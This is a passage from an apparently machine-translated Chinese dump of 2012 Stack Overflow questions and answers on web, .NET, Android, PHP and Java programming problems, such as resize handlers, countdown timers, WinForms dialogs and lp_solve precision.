<body onresize="showMsg()"> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T14:52:04.537

有道理，您是否尝试过检查`after`函数返回的页面的来源？没有更多的 body 标签了 - 你的事件监听器（或者可能仍然在内存中，无用地晃来晃去）。
尝试将其附加到`window`.

```
window.onresize = function()
{
    document.write((this.innerWidth/this.innerHeight)*100+'%');
}; 
```

现在在以前非常流行的浏览器的旧版本中，这（将事件侦听器附加到窗口对象）会导致内存泄漏。[如果您需要，](https://stackoverflow.com/questions/11186750/memory-leak-risk-in-javascript-closures) window 对象永远不会在此处真正销毁更多信息。

如何解决内存问题？

```
(function(win)
{
    win.onresize = function()
    {
        document.write((this.innerWidth/this.innerHeight)*100+'%');
    };
    if (win.attachEvent)
    {
        win.attachEvent('onbeforeunload',(function(self)
        {
            return function freeMem()
            {
                self.onresize = null;
                self.detachEvent('onbeforeunload',freeMem);
            };
        })(win));
        return;
    }
    win.addEventListener('beforeunload',(functio(self)
    {
        return function freeMem()
        {
            self.onresize = null;
            self.removeEventListener('beforeUnload',freeMem,false);
        };
    })(win),false);
})(this);//this points to current window 
```

我知道，看起来很糟糕，但是我已经对此进行了测试，并且确实可以解决问题-感谢该 IE。`win`严格来说，传递给的闭包`self`可以省略，但我将其保留在其中以绝对确定，一旦`onbeforeunload`事件触发，处理程序返回*所有*函数并且引用超出范围，因此 GC 没有理由*不*释放记忆。
在大多数情况下，这太过分了，但以防万一有人关心，我决定在这里发布...... :-P

# c# - .NET 可移植框架中的 System.Drawing.Bitmap

> ID：11583674
> 
> 赞同：4
> 
> 时间：2012-07-20T16:46:17.493
> 
> 标签：c#, porting, portable-class-library

作为练习，我正在尝试将[Overv/SteamWebAPI](https://github.com/Overv/SteamWebAPI)移植到可移植类库。但是，其中一个函数返回`System.Drawing.Bitmap`.NET Portable 子集中不可用的 。

考虑到下面的功能，最好的选择是什么？由于项目的性质，我不关心向后兼容性。

有问题的功能：

```
/// <summary>
/// Retrieve the avatar of the specified user in the specified format.
/// </summary>
/// <param name="user">User</param>
/// <param name="size">Requested avatar size</param>
/// <returns>The avatar as bitmap on success or null on failure.</returns>
public Bitmap GetUserAvatar(User user, AvatarSize size = AvatarSize.Small)
{
    if (user.avatarUrl.Length == 0) return null;

    try
    {
        WebClient client = new WebClient();

        Stream stream;
        if (size == AvatarSize.Small)
            stream = client.OpenRead(user.avatarUrl + ".jpg");
        else if (size == AvatarSize.Medium)
            stream = client.OpenRead(user.avatarUrl + "_medium.jpg");
        else
            stream = client.OpenRead(user.avatarUrl + "_full.jpg");

        Bitmap avatar = new Bitmap(stream);
        stream.Flush();
        stream.Close();

        return avatar;
    }
    catch (Exception e)
    {
        return null;
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T19:29:18.543

可移植类库[不包含](http://msdn.microsoft.com/en-us/library/gg597391.aspx)图形或 Web 客户端支持。

如果这是唯一有问题的方法，也许您可​​以在可移植库中丢弃此唯一方法。或者，您可以考虑返回*Stream*，尽管您仍然需要找到一种解决方法来从 Web 读取位图。

**更新**

据我所知，该方法可以设为静态。因此，另一种选择是为不可移植代码创建额外的平台特定（.NET、Silverlight、WP7）库，并将此方法移动到平台特定库中的静态类。如果将该方法设为扩展方法，则无需修改客户端代码即可使用该方法。当然，除了该方法应该返回[System.Windows.Media.Imaging.BitmapSource](http://msdn.microsoft.com/en-us/library/system.windows.media.imaging.bitmapsource.aspx)而不是*System.Drawing.Bitmap*。

# php - 创建父表单后如何将第一个子集合表单嵌入到 symfony2 中？

> ID：11583677
> 
> 赞同：1
> 
> 时间：2012-07-20T16:46:24.310
> 
> 标签：php, forms, symfony

我有一个表格和一组表格。我想首先创建没有子集合表单的父表单，然后如果用户尝试添加子表单，它将立即创建它。

例如 symfony2 在[这里](http://symfony.com/doc/current/cookbook/form/form_collections.html)：

```
 // $tag1 = new Tag();
    // $tag1->name = 'tag1';
    // $task->getTags()->add($tag1);
    // $tag2 = new Tag();
    // $tag2->name = 'tag2';
    // $task->getTags()->add($tag2);

    $form = $this->createForm(new TaskType(), $task); 
```

我的问题是如何动态添加第一个子表单。假设我们没有上面代码的注释部分。TaskType() 表格可以在[这里](http://symfony.com/doc/current/cookbook/form/form_collections.html)找到。

我的观点是，如果我的代码片段中没有注释部分，您就无法`data-prototype`即时创建和使用它。在那儿 ？

# javascript - 如何以最大的兼容性检测桌面和移动浏览器的宽度

> ID：11583678
> 
> 赞同：0
> 
> 时间：2012-07-20T16:46:27.930
> 
> 标签：javascript, jquery, browser, browser-width

所以我正在运行媒体查询和这段代码：

```
 //Check different widths as different browsers report it differently
 if ($(window).width()!==0) {
     width = $(window).width();
 }
 else if (window.innerWidth!==0) {
     width = window.innerWidth;
 } 
```

但现在看来，这些与我的媒体查询不匹配。再加上某些手机不喜欢这些宽度，这意味着我的样式并不总是与我添加的 JS 样式相匹配。

有人有完整的方法来使用 JavaScript 或 jQuery 检测浏览器宽度吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:53:04.890

[情况很复杂](http://tripleodeon.com/wp-content/uploads/2011/12/table.html)，您要么需要一个插件来为您处理所有各种浏览器特性，要么您需要自己做这件事。[这篇文章](http://tripleodeon.com/2011/12/first-understand-your-screen/)对我很有帮助。

# asp.net-mvc-3 - asp.net MVC 和 $.ajax 增加了性能开销

> ID：11583679
> 
> 赞同：6
> 
> 时间：2012-07-20T16:46:30.710
> 
> 标签：asp.net-mvc-3, jquery

当 jquery $.ajax 函数调用 asp.net MVC 控件时，我偶然发现了一个非常奇怪的性能不佳问题。该控件执行一个需要 403 毫秒的数据库操作，但根据 Firebug，总的 $.ajax 调用是 3400 毫秒，这是相当多的额外开销。我需要优化性能，但我不清楚这些开销来自哪里。

这是代码。在我的控制器中，我有

```
 public JsonResult SetSearchResults(Criteria searchCriteria)
 {

       SearchResult myReportsResult = _repository.GetResults(searchCriteria);    

       //the statement above takes 403 ms

       return Json(myReportsResult);
  }

 public  SearchResult GetResults(SearchCriteria searchCriteria)
  {
        SearchResult result = SearchResult();

         DataTable dbResults = _da.GetDBResults(searchCriteria);       

        List<IncidentReportHeader> irs = new List<IncidentReportHeader>();            

        for (int i = 0; i < dbResults.Rows.Count; i++)
        {
            IncidentReportHeader ir = new IncidentReportHeader();

            //populate all the properties of the ir object here,                

            irs.Add(ir);
        }

        result.Reports = irs;       
        return result;        
}

    //models
    public class SearchResult
    {

        private List<IncidentReportHeader> _res;
        private int _numOfPages=0;
        private int _recordsPerPage=0;

        public List<IncidentReportHeader> Reports {
            get { return _res; }
            set
            {
                _res = value;              
            }        
        }           

        public SearchResult()
        {
            _res = new List<IncidentReportHeader>();
        }
    }
}

//db call
   public DataTable GetDBResults(SearchCriteria searchCriteria)
       {
         //add all params to the db object needed for the stored procedure here

            DataTable dt = _db.ExecuteStoredProc("myDB.PACKAGE_NAME.stored_proc", 2000, ref  _spParams, ref _spResultVariables);
           return dt;

} 
```

在我的 JS

```
function SearchIncidentReports() {

    //pack the  searchCriteria object here
    var searchCriteria = ...

    var start = new Date().getTime();

    $.ajax({
        contentType: 'application/json, charset=utf-8',
        type: "POST",
        url: myController/SetSearchResults,
        data: JSON.stringify({ searchCriteria: searchCriteria }),
        cache: false,
        dataType: "json",

        success: function (response) {

            var got_data = new Date().getTime();
            var diff1 = got_data - start;
            alert("data loaded in: " + diff1 + " ms");

             // do whatever you need with the data here.  
             // diff1 = 3400ms which is what Firebug shows too

        },

        error: function (xhr, ajaxOptions, thrownError) {
            var result = $.parseJSON(xhr.responseText);
            alert(result.ErrorMessage);
        }

    });
    return false;
} 
```

另请注意，当删除数据库调用并手动填充对象时，性能非常快。

似乎从 403 毫秒到 3400 毫秒是完全错误的，并且显然有不合理的开销。你能指出这里做错了什么吗？这是非常简单的骨头，我真的无法避免去数据库。

我尝试让控件返回空集（ActionResult）而不是 JsonResult，但它有同样的问题。

这是 asp.net MVC 问题吗？

## 更新

我还有一个操作，它返回一个 Excel 文件和其中的完全相同的数据库操作。该文件在 410 毫秒内返回并且不使用`$.ajax`函数。似乎`$.ajax`以某种方式导致了延迟。我只需要从数据库中获取数据，而且通常速度非常快。

我添加了控制器代码的内部，因为有人要求它，但我会重复内部（是的，控制器调用的总内部）需要 403 毫秒。显然，问题不在于服务器或数据库调用。在我看来，它位于客户端和服务器之间。

笔记：

1.  在 Firebug 中，使用 Action GetResults 进行 POST 的总时间为 3.54 秒。
2.  当我导航到 Firebug 中的 Net->All 时，其中列出了请求的细分，我看到等待的时间最长（3.5 秒）。

在服务器和客户端之间进行通信时，似乎花费了 3.5s - 403ms 的时间，但是在哪里以及为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T17:38:17.740

我发现了问题，问题在于数据库调用。但是，我最初被误导的原因是计算时间差的一段代码。

```
DateTime start = DateTime.Now;

SearchResult myReportsResult = _repository.GetResults(searchCriteria);  

DateTime got_it = DateTime.Now; 
TimeSpan diff = (got_it - start);
int diff_ms = diff.Milliseconds; 
```

这段代码没有给我正确的毫秒值。

# yii - Yii - 向导行为扩展 - 跳过步骤

> ID：11583680
> 
> 赞同：2
> 
> 时间：2012-07-20T16:46:40.207
> 
> 标签：yii, wizard, yii-extensions

我希望stackoverflow上的人对向导行为扩展有一些经验：[http ://www.yiiframework.com/extension/wizard-behavior/](http://www.yiiframework.com/extension/wizard-behavior/)

问题是当我在第一页（用户）上单击提交时，它一直到计费页面并跳过公司页面......帮助？

我有 3 个步骤来收集信息：用户、公司和计费页面。这是我的控制器中的行为功能：

```
public function behaviors() {
    return array(
     'wizard'=>array(
      'class'=>'ext.WizardBehavior.WizardBehavior',
      'steps'=>array(
       'user','company','billing'
      )
     )
    )
} 
```

这是我的流程步骤功能：

```
public function wizardProcessStep($event) {
    $name = '_wizard'.ucfirst($event->step);
    if (method_exists($this, $name)) {
        call_user_func(array($this,$name), $event);
    } else {
        throw new CException(Yii::t('yii','{class} does not have a method named "{name}"', array('{class}'=>get_class($this), '{name}'=>$name)));
    }
} 
```

这里以我公司的步骤为例：

```
protected function _wizardCompany($event) {
    echo 'called company';
    exit();
    $company=new Company;
    if(isset($_POST['Company'])) {
        $company->attributes=$_POST['Company'];
        if($company->validate()) {
            $event->sender->save($company->attributes);
            $event->handled = true;
        }
    }
    $this->render('new_company',array(
        'company'=>$company,
        'event'=>$event,
    ));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T14:41:54.047

这似乎不是错误，而是设计使然。默认情况下，WizardBehavior 会跳到第一个未处理的步骤。

您可能正在测试您的向导并在“用户”和“公司”中输入了一些内容。当您现在处于“计费”时，然后返回“用户”（通过 url 或链接）。输入内容并再次提交，它会跳到结算，因为这是第一个未处理的步骤。请注意，您可以通过 URL 和链接转到“公司”和所有先前处理的步骤。

可以通过以下方式将此行为设置为 false

```
public function behaviors() {
    return array(
     'wizard'=>array(
      'autoAdvance' => false,
     )
    )
} 
```

或者您实现 onFinish 事件，以便在测试时轻松重置向导。

# android - 如果启动了新计时器，则重置计时器

> ID：11583685
> 
> 赞同：0
> 
> 时间：2012-07-20T16:47:20.783
> 
> 标签：android, reset, countdowntimer

看到应用程序有两个按钮。一个启动三十秒计时器，另一个启动六十秒计时器。启动计时器没有问题。问题是，假设我点击了 60 秒按钮，然后立即点击 30 秒按钮，textview 在从 60 到 0 和 30 到 0 倒计时之间切换。它变成 59 28 57 26 等等..我想要什么要知道的是，假设我先点击 60 秒，然后点击 30 秒按钮，我希望取消 60 秒倒计时并开始 30 秒倒计时。

这是我的代码。我只发布相关的部分。

**[编辑]**我现在已经发布了整个代码。

```
package com.android.tapme;
import android.app.Activity;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

public class TapMe extends Activity {

private int countValue = 0, psuedoCountValue = 0;
private TextView textView1;
private TextView textView2;
Button tapButton;
Button sixty_seconds;
Button thirty_seconds;
private boolean thirtyon=false, sixtyon=false;
boolean timeUp=false;
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_tap_me);
    tapButton= (Button) findViewById(R.id.tapButton);
    textView1 = (TextView) findViewById(R.id.textView1);
    textView1.setTextSize(40);
    textView2 = (TextView) findViewById(R.id.textView2);
    textView2.setTextSize(20);
    thirty_seconds = (Button) findViewById(R.id.thirty_seconds);
    sixty_seconds= (Button) findViewById(R.id.sixty_seconds);
    sixty_seconds.setOnClickListener(new View.OnClickListener() {
              public void onClick(View v) {
                  timeUp=false;
                  countValue=0;
                  sixtyon=true;
                  checkTapValue();
                  MyCount myCount=new MyCount(60000,1000);
                  if(thirtyon==true)
                  {
                      myCount.cancel();
                  }
                  myCount=new MyCount(60000,1000);
                  thirtyon=false;
                  myCount.start();
            }
            });
    thirty_seconds.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                timeUp=false;
                countValue=0;
                thirtyon=true;
                checkTapValue();
                MyCount myCount=new MyCount(30000,1000);
                if(sixtyon==true)
                {
                    myCount.cancel();
                }
                myCount=new MyCount(30000,1000);
                sixtyon=false;
                myCount.start();
      }
    });
}
private void checkTapValue() {
    tapButton.setOnClickListener(new View.OnClickListener() {
        public void onClick(View v) {
            if(timeUp==false)
            {
            countValue++;
            textView1.setText(Integer.toString(countValue));
            }
            else if(timeUp==true)
            {
            psuedoCountValue=countValue;
            textView1.setText(Integer.toString(psuedoCountValue));
            }
        }
    });

}
public void disable_Button()
{       
    timeUp=true;
    psuedoCountValue=countValue;
}

class MyCount extends CountDownTimer {
    public MyCount(long millisInFuture, long countDownInterval) {
        super(millisInFuture, countDownInterval);
    }
    @Override
    public void onFinish() {
        disable_Button();
        textView2.setText("Time's up!");
    }

    @Override
    public void onTick(long millisUntilFinished) {
        System.out.println(millisUntilFinished);
        textView2.setText("" + (int) (millisUntilFinished / 1000));
    }
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:03:26.383

您没有保留对当前 myCount 的引用。你现在正在做的是创建一个新的（甚至还没有开始），然后取消它。

它应该看起来像这样：

```
public class TapMe extends Activity {

    // all other fields

    private MyCount currentCount;

    @Override
    public void onCreate(Bundle savedInstanceState) {

        // code...

        sixty_seconds.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                timeUp=false;
                countValue=0;
                sixtyon=true;
                checkTapValue();
                if (currentCount != null) {
                    currentCount.cancel();
                }
                currentCount=new MyCount(60000,1000);
                thirtyon=false;
                currentCount.start();
            }
        );

        // code...

    }    

    // the rest of the code

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-21T08:58:15.730

@Marcus虽然您的答案不是正确的，但本质上是正确的。

我只需要创建两个单独的对象并在另一个被激活时取消其中一个。

```
 if(thirtyCount!=null)
                  {
                      thirtyCount.cancel();
                  }
                  sixtyCount.start(); 
```

这就是解决方案。

# c# - 添加项目时C#中的列表框有一个空行？

> ID：11583688
> 
> 赞同：0
> 
> 时间：2012-07-20T16:47:39.747
> 
> 标签：c#, winforms, listbox, string

因此，我不得不为一个小型 C# 项目使用 Listbox，并遇到了问题。列表框显示文件名，每次有人使用文件对话框添加项目时都会添加一个项目。问题是当第一个文件被添加时，什么都没有出现。但是当添加第二个文件时，它是一个空行。

这是一张图片来说明问题：

![列表框的问题](../Images/4d18d4e2a61c517928648db03e2ac902.png)

现在，我如何摆脱第一个空行并将文件名正确添加到列表框的顶部？

这是我用来添加到列表框的代码。

```
// Set a global variable to hold all the selected files result
List<String> fullFileName;

private void addBtn_Click(object sender, EventArgs e)
{
    DialogResult result = fileDialog.ShowDialog(); // Show the dialog.
    if (result == DialogResult.OK) // Test result.
    {
       // put the selected result in the global variables
       fullFileName = new List<String>(fileDialog.FileNames);
       // add just the names to the listbox
       foreach (string fileName in fullFileName)
       {
           dllBox.Items.Add(fileName.Substring(fileName.LastIndexOf(@"\") + 1));
       }
   }
} 
```

这是fileDialog的属性：

![文件对话框](../Images/c1b7305ea619791e09153d01f256dd39.png)

以及 dllBox 属性

![1a1s](../Images/9a6ecb1f5ae3dfdaaa18cf7f00f13ac7.png) ![21](../Images/dcc6e994e1604dc0309ec91b6d30a1cc.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:27:16.270

尝试在列表框属性中将 DrawMode 更改为**Normal**而不是**OwnerDrawFixed**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:58:19.230

试试这段代码，看看会发生什么。

```
private void button1_Click(object sender, EventArgs e)
{
    using (var dialog = new OpenFileDialog())
    {
        dialog.Multiselect = true;
        if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
        {
            listbox.Items.Clear();
            listbox.Items.AddRange(dialog.FileNames.Select(x => System.IO.Path.GetFileName(x)).ToArray());
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T17:03:43.873

不清楚。不确定您要在这里实现什么。您的代码中还有一些奇怪的东西（`string file = ...`从未使用过，`fullFileName`每次都会获得一个新实例，不知道在哪里`fileDialog`实例化......）。

尝试以下操作：

```
private void button1_Click(object sender, EventArgs e)
{
    // Adds the selected file to the list
    using (OpenFileDialog dlg = new OpenFileDialog
        {
            Multiselect = false
        })
    {
        if (dlg.ShowDialog() == System.Windows.Forms.DialogResult.OK)
        {
            this.listBox1.Items.Add(Path.GetFileName(dlg.FileName));
        }
    }
}

private void button2_Click(object sender, EventArgs e)
{
    // Adds all selected files to the list
    using (OpenFileDialog dlg = new OpenFileDialog
    {
        Multiselect = true
    })
    {
        if (dlg.ShowDialog() == System.Windows.Forms.DialogResult.OK)
        {
            foreach (var fileName in dlg.FileNames)
            {
                this.listBox1.Items.Add(Path.GetFileName(fileName));
            }
        }
    }
} 
```

# lpsolve - 为什么 lp_solve 在普通实例上失败？

> ID：11583689
> 
> 赞同：0
> 
> 时间：2012-07-20T16:47:44.013
> 
> 标签：lpsolve

我正在尝试使用 lp-solve 解决以下实例

```
/* Objective function */
min: +x;

/* Constraints */
+2046853249 x +2046853248 y +c = 0;
+1954481150 x +1954481149 y +c = 0;
R3: +x >= 1;

/* Variable bounds */
-10000 <= x <= 10000;
-10000 <= y <= 10000;
-10000 <= c <= 10000;

/* Integer definitions */
int x,y,c; 
```

这似乎不是一个困难的例子，但 lp-solve 无法解决它。我对 lp-solve 文档的理解是，求解器实际上开始将实例作为常规 lp 求解，然后将问题修复为整数定义。在这种情况下，lp-solution 应该是正确的。

有人可以给我一些见解，为什么这不起作用？特别是，是否有快速解决此类实例的“技巧”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:42:34.643

我与一些 lp_solve 的开发人员进行了交谈。问题的原因显然是 lp_solve 在内部使用了 double 类型的变量，并且它们没有提供足够的精度来处理这么大的整数。

看起来使用 lp_solve 解决这样的系统是不可能的。如果你遇到像我这样的类似问题，你可能会搜索另一个工具。

# c# - 使用 Windows 窗体从主窗口更新无模式对话框

> ID：11583690
> 
> 赞同：2
> 
> 时间：2012-07-20T16:47:45.763
> 
> 标签：c#, .net, winforms

我正在开发 C#/.NET 3.5/Windows 窗体程序。我想创建一个无模式对话框，然后使用从主窗体生成的信息对其进行更新。我发现了其他方向的几个示例 - 对话框中的信息更新了主窗口，但我在反向移动时遇到了麻烦。对话框中的 GUI 无法正常工作。鼠标光标是一个沙漏。我有时会看到更新，但我经常看到一个纯白框、曾经位于对话框顶部的其他窗口的残留物，或者它冻结了。

最终对话框将显示更复杂的信息，但现在我只是试图复制一个显示为主窗口标签的计数器。要启动对话框，我执行以下操作：

```
 bool secondWindowOpen = false;
    Thread secondWindowThread;
    MyPopupWindow secondWindow;

    delegate void TextBoxDelegate(string message);

    private void buttonPop_Click(object sender, EventArgs e)
    {
        // If the second window is not open, then open it
        if (!secondWindowOpen)
        {
            secondWindowOpen = true;

            secondWindow = new MyPopupWindow();
            secondWindowThread = new Thread(secondWindow.MyMethod);
            secondWindowThread.Start();

        }
        else // Close the second window
        {
            secondWindowOpen = false;
            secondWindow.ShouldStop = true;

            secondWindowThread.Join();                
        }
    } 
```

我使用以下代码更新计数器：

```
if (secondWindow != null)
{
    secondWindow.CounterText = args.FrameNumber.ToString();
} 
```

用于控制无模式对话框的代码如下所示。我承认设置文本字段的代码可能是错误的，但这是我目前所做的最好的事情（调用调用给我带来了麻烦）。

```
public partial class MyPopupWindow : Form
{
    public MyPopupWindow()
    {
        InitializeComponent();
    }

    public bool ShouldStop
    {
        get { return shouldStop; }
        set { shouldStop = value; }
    }
    private bool shouldStop = false;

    public void MyMethod()
    {            
        this.Show();
        this.Refresh();

        while (!shouldStop)
        {
            Thread.Sleep(100);
            labelCounter.Text = CounterText;
            Refresh();
        }

        this.Close();
    }

    public string CounterText;
} 
```

我的大问题如下：当无模式对话框只需要更新自己的 GUI 元素时，将它放入第二个线程的最佳方法是什么？从主窗口/线程更新这些 GUI 元素的最佳方法是什么？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:23:20.103

表单的工作方式是，如果程序是一个处理消息并将它们传递给要处理的表单的循环，那么其核心是。如果您的表单从未将控制权返回给您的消息循环，则您的程序将停止正常工作。您已尝试通过添加更多线程来解决此问题，但这种方式会导致其自身的痛苦。

您不能在线程中执行此操作，因为应用于表单的所有操作都必须在 UI 线程上完成。您可以使用 BeginInvoke 将 Invalidate 之类的调用传回给 UI 线程，但这会变得非常混乱 - 编写在一个 UI 线程上运行的协作窗口要比触发大量线程然后尝试将 UI 线程插入其中要好得多为他们做事。

为此，您将创建表单，然后将控制权返回给您的消息处理循环。将来，您将通过按钮单击等事件关闭窗口。如果您需要因任何事件而更新窗口，您可以在事件处理程序中调用 invalidate 然后返回。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T19:29:47.400

根据 Jason 的建议，我最终简化了事情并让它真正发挥作用。

首先，当我显示第二个窗口时，不再启动新线程。相反，我执行以下操作：

```
bool secondWindowOpen = false;
MyPopupWindow secondWindow;

private void buttonPop_Click(object sender, EventArgs e)
{
    // If the second window is not open, then open it
    if (!secondWindowOpen)
    {
        secondWindowOpen = true;
        secondWindow = new MyPopupWindow();
        secondWindow.Show();                
    }
    else // Close the second window
    {
        secondWindowOpen = false;
        secondWindow.Close();
    }
} 
```

然后我将第二个窗口中的代码简化为以下内容：

```
public partial class MyPopupWindow : Form
{
    public MyPopupWindow()
    {
        InitializeComponent();
    }

    public string CounterText
    {
        set { labelCounter.Text = value; }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-03T09:59:07.387

首先，请为我的英语道歉，因为我是法国人。

然后，如果我理解您的问题，您想从第一个表单更新第二个表单的控件。

请使用表单的标签对象。

1.  创建一个类来存储要在表单之间传输的数据
2.  从第一个表单创建第二个表单的实例，如下所示：

    `Form2 f = new Form2();
    f.Tag = MyDataObject();`

3.  显示表单

    `f.Show() => Modeless way`或者`f.ShowDialog => Modal way`

4.  在 Form2 的构造函数中，您从 Tag 对象更新控件，如下所示：

    `public Form2()
    {
    MyDataObject do = (MyDataObject)this.Tag;
    MyLabel.Text = do.LabelText;
    }`

5.  如果您想从 Form2 到主窗体，请执行以下操作：

    进入Form2

    `this.Tag = MyDataObject;
    this.Close();`

进入主窗体：

```
`MyDataObject do = (MyDataObject)f2.Tag;` 
```

我知道这个话题很旧，但希望这会有所帮助

# javascript - 如何将我自己的验证代码添加到 MooTools lightface 表单

> ID：11583698
> 
> 赞同：0
> 
> 时间：2012-07-20T16:48:27.947
> 
> 标签：javascript, forms, mootools, validation

我创建了一个简单的 javascript 函数来验证使用 mootools 创建的表单以在 facebook 应用程序中工作：

Facebook 竞赛应用[点击这里](http://www.webninjas.ie/apps/facebook/sns-contest-danny/contest/index/2)

原始验证是使用 HTML5 完成的，但由于这不适用于所有浏览器，我不得不尝试想出一些可以做到的东西！所以我创建了一个简单的javascript函数，我知道它可以工作，但是我无法让它与mootools lightface一起工作，因为我在提交按钮的单击上进行了验证，但是使用lightface插件我没有选择这样做如果有意义的话，提交按钮是独立于表单定义的吗？

我不知道如何在此处上传代码，但如果您转到链接并选择“Chuckie”作为答案，您将看到显示的表单并可以从那里查看框架源！

这是我的验证码：

```
function validate(form) {
    var fail = false;
    var name = document.getElementById("full_name");

    if (name.value.length == 0) {
      document.getElementById("okName").className = "fail";
      fail = true;
    }else{
      document.getElementById("okName").className = "success";
    }

    var email = document.getElementById("email");
    var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;

    if (email.value.length == 0 || !emailPattern.test(email.value)) {
      document.getElementById("okEmail").className = "fail";
        fail = true;
    }else{
      document.getElementById("okEmail").className = "success";
    }

    var phone = document.getElementById("phone");
    var phonePattern = /^\+?[0-9]{0,15}$/ ;

    if (phone.value.length == 0 || !phonePattern.test(phone.value)) {
      document.getElementById("okPhone").className = "fail";
        fail = true;
    }else{
      document.getElementById("okPhone").className = "success";
    }

    if ( fail ) {
        alert( "You didn't fill out all inputs" );
    } else {
        alert( "Everything OK" );
    }
}//End of validation function 
```

如果可能的话，我基本上想要的只是将此方法传递给mootools提交按钮？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T08:43:55.223

你真的应该给 Form.Validator 一个旋转（来自 mootools-more）。

带有一堆预制的验证器以及自己定义验证器的能力。

[http://mootools.net/docs/more/Forms/Form.Validator](http://mootools.net/docs/more/Forms/Form.Validator)

此外，如果您使用的是 mootools，您可能希望留在 api 中。

*   `document.getElementById()`->`document.id()`
*   `element.value`->`element.get('value')`
*   `element.addClass('validation-failed')`
*   `element.toggleClass('validation-failed')`
*   `element.hasClass('validation-failed')`
*   `element.property = value`->`element.set('property', value);`

如果这个函数打算在提交事件上运行，您可能想要更改它，以便将它作为上下文 ( `this`) 绑定到表单，参数是`event`您可以停止的。

```
function validate(event) {
    var fail = false;

    // logic.

    if (fail) {
        event && event.stop && event.stop();
        return false;
    }
    this.submit();
}

document.id('someform').addEvent('submit', validate); 
```

# java - 字符串拆分（）无法正常工作

> ID：11583699
> 
> 赞同：1
> 
> 时间：2012-07-20T16:48:29.863
> 
> 标签：java

```
temp = line.split(",");
if (i < paymentFieldsMapIndex.size()) {
    paymentFields.put(paymentFieldsMap.get(next).toString(), temp[i]);
} 
```

此代码将逗号分隔的字符串拆分为子字符串，并使用生成的子字符串填充 HashMap 值。

一些子字符串值在生成的 HashMap 中看起来很有趣，看起来这是由于令牌中存在逗号。

例如

，“伦敦，英国”，

在字符串中出现在 HashMap 之类的

键=键，值=“伦敦

我认为 String split() 不会分解包含定界符的子字符串，如果它们用双引号引起来？

我也尝试过转义嵌入式逗号

，“伦敦，英国”，

但 HashMap 中的字符串看起来像

键=键，值=“伦敦\

我错过了什么，或者有什么办法可以解决这个问题？谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-20T16:51:19.010

> *“我认为 String split() 不会分解包含定界符的子字符串，如果它们用双引号引起来？”*

您在这里的假设是不正确的。[`split()`](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#split%28java.lang.String%29)除了你传递的正则表达式之外，什么都不关心。

如果您需要在尊重引号的同时将其拆分，[有很多方法可以实现](https://stackoverflow.com/questions/1757065/java-splitting-a-comma-separated-string-but-ignoring-commas-in-quotes)。

# javascript - javascript 和 Internet Explorer 8

> ID：11583700
> 
> 赞同：0
> 
> 时间：2012-07-20T16:48:42.140
> 
> 标签：javascript, jquery, jsp, internet-explorer-8

我有一个jsp页面，它使用JavaScript在onload页面事件中进行自动选择，并使用一些jQuery来动态扩展不同的div标签，其中包含一些内容。

所以问题是`setSelection`在页面底部的脚本标签中的方法的调用，以及在被调用的js方法中的jQuery方法`toggle`在IE8中根本不起作用。但是在 Chrome、Firefox 和 IE9 中它可以正常工作。

我已经用谷歌搜索了很多这个问题，但我找不到任何有用的东西。IE8 中的调试器工具向我显示的唯一错误是“需要对象”和“需要表达式”。

这是代码：

```
 <html>
        <head>
            <script type="text/javascript" src="jquery-1.7.2.js"></script>
            <script type="text/javascript">
                function toggle(el)
                {
                    var val = el.options[el.selectedIndex].value;
                    if (val == "1")
                    {
                        document.getElementById("2").style.display = "none";
                        $("#1").slideToggle(250);
                    }
                    else if (val == "2")
                    {
                        document.getElementById("1").style.display = "none";
                        $("#2").slideToggle(250);
                    }
                    else if (val == "0")
                    {
                        document.getElementById("1").style.display = "none";
                        document.getElementById("2").style.display = "none";
                    }
                }
                function setSelection(selection) 
                {
                    //Here we make dynamic selection of the combo box
                    var selct = document.getElementById("sel");
                    selct.options[selection].setAttribute("selected", "selected");
                    toggle(selct);
                }
            </script>
        </head>
        <body>

        <select name="mySel" id = "sel" onchange="toggle(this);">
            <option value="0">Zero</option>
            <option value="1">One</option>
            <option value="2">Two</option>
        </select>
        <div id="1" style="border:1px;">
        </div>
        <div id="2" style="border:1px;">
        </div>
        <script>
            setSelection(0);
        </script>
        </body>
        </html> 
```

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T17:06:06.407

将您的代码包装在文档就绪函数中并尝试。

```
jQuery(document).ready(function($) {
    // Stuff to do as soon as the DOM is ready. Use $() w/o colliding with other libs;
}); 
```

# java - Java Quartz Scheduler 错误或我的配置有问题

> ID：11583701
> 
> 赞同：0
> 
> 时间：2012-07-20T16:48:58.973
> 
> 标签：java, struts2, nullpointerexception, quartz-scheduler

我通过使用实现 ServletContextListener 的 Servlet 在 strut2 web-app 中添加了 QuartzFramework。在使用石英属性的 servlet 中，我创建了一个名为“AsyncJobsQuartz”的石英实例，并使用 scheduler.start() 启动它。

